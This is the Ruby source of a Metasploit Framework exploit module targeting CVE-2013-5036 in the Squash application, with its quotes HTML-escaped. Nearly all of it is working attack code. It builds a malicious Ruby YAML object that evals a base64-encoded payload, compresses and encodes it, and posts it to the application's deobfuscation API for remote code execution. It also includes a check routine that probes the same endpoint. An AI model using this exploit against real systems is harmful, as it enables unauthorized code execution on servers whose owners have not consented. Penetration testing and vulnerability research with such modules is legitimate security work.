# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;zlib&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Squash YAML Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote code execution vulnerability in the
        YAML request processor of the Squash application.
      },
      &#039;Author&#039;         =>
        [
          &#039;Charlie Eriksen&#039; # Discovery, initial exploit
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/&#039;],
          [ &#039;OSVDB&#039;, &#039;95992&#039;],
          [ &#039;CVE&#039;, &#039;2013-5036&#039;]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>  [ [&#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039; => &#039;Aug 06 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, "/"])
      ], self.class)

  end

  def check
    response = send_request_cgi({
        &#039;uri&#039;     => normalize_uri(target_uri.path, "api", "1.0", "deobfuscation"),
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => &#039;application/json&#039;,
      })

    if response.code == 422
      print_status("Got HTTP 422 result, target may be vulnerable")
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    code = Rex::Text.encode_base64(payload.encoded)
    yaml =  "--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
        "&#039;#{rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);&#039; " +
        ": !ruby/object:OpenStruct\n table:\n  :defaults: {}\n"
    payload = Rex::Text.encode_base64(Zlib::Deflate.deflate(yaml)).gsub("\n", "")
    data = "{\"api_key\":\"1\",\"environment\":\"production\",\"build\":\"1\",\"namespace\":\"#{payload}\"}"

    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path, "api", "1.0", "deobfuscation"),
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;data&#039;    => data
    })
  end
end

